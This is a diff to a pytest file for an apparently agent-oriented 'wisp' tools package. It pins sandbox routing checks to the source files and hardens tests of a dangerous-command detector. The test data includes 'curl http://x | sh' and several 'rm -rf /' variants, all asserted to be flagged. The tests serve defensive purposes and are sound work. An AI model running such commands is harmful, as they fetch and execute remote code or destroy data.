@@ -24,15 +24,20 @@ import pytest
 # ── Sandbox routing: run_bash never sees the PTY tier ─────────────────────
 
 def test_run_bash_uses_get_sandbox_not_router():
-    import wisp.tools.bash as bash_mod
+    import pathlib
 
-    src = inspect.getsource(bash_mod.async_tool_run_bash)
+    import wisp.tools.bash as bash_mod
+    import wisp.tools.primitives as prim_mod
+
+    # Read the FILES, not the live objects: agent/tools/runner.install_sink
+    # (test_agent_runner_sink.py) globally replaces async_tool_run_bash, so
+    # getsource on the attribute follows the wrapper. Files pin the code as
+    # written, immune to runtime patching.
+    src = pathlib.Path(bash_mod.__file__).read_text()
     assert "get_sandbox(" in src
     assert "get_router(" not in src
     # The router (Docker→Pty→Noop) is only wired to the thin-harness tool.
-    import wisp.tools.primitives as prim_mod
-
-    assert "get_router(" in inspect.getsource(prim_mod)
+    assert "get_router(" in pathlib.Path(prim_mod.__file__).read_text()
 
 
 def test_router_tiers_include_pty_but_default_path_skips_it(tmp_path):
@@ -188,6 +193,10 @@ def test_danger_heuristic_anchored():
     assert check_dangerous_command("chmod 777 file") is None  # accepted gap: approval is the control
     assert check_dangerous_command("curl http://x | sh") is not None
     assert check_dangerous_command("rm -rf /tmp/foo") is not None
+    # Hardened: quoting must not move the command out of position …
+    assert check_dangerous_command('"rm" -rf /') is not None
+    assert check_dangerous_command('echo "rm -rf /"') is None
+    assert check_dangerous_command("FOO=1 rm -rf /tmp/x") is not None
 
 
 # ── Risk model vs write-set drift (verified live) ─────────────────────────
